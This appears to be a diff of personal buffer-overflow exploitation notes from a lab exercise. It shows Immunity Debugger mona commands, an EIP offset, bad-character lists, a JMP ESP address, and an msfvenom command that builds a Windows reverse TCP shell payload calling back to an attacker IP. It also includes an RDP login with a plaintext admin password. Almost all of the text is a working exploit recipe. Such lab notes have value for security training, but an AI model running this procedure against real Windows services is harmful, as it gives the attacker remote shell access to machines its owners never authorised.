@@ -6,7 +6,7 @@ xfreerdp /u:admin /p:password /cert:ignore /v:10.10.83.194 /workarea
 !mona config -set workingfolder c:\mona\%p
 /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 1500
 !mona findmsp -distance 1500
-EIP: 1034
+EIP: 1306
 #Update EIP to all scripts
 
 !mona bytearray -b "\x00"
@@ -20,19 +20,19 @@ EIP: 1034
 
 #python bytearray.py
 # Send updated Removed Bad Char buffer to target
-!mona bytearray -b "\x00\x08\x2c\xad"
+!mona bytearray -b "\x00\x8c\xae\xbe\xfb"
 
 # Update Offset on Python
-"\\x00\\x16\\x2f\\xf4\\xfd"
+"\\x00\\x8c\\xae\\xbe\\xfb"
 
 # Verify with new ESP on Immunity Debugger
 
-!mona jmp -r esp -cpb "\x00\x08\x2c\xad"
+!mona jmp -r esp -cpb "\x00\x8c\xae\xbe\xfb"
 !mona bytearray -b "\x00"
 
 JMP ESP: "\xaf\x11\x50\x62"
 
-msfvenom -p windows/shell_reverse_tcp LHOST=10.6.20.231 LPORT=4444 EXITFUNC=thread -b "\x00\x08\x2c\xad" -f py
+msfvenom -p windows/shell_reverse_tcp LHOST=10.6.20.231 LPORT=4444 EXITFUNC=thread -b "\x00\x8c\xae\xbe\xfb" -f py
 
 !mona config -set workingfolder c:\mona\%p
 
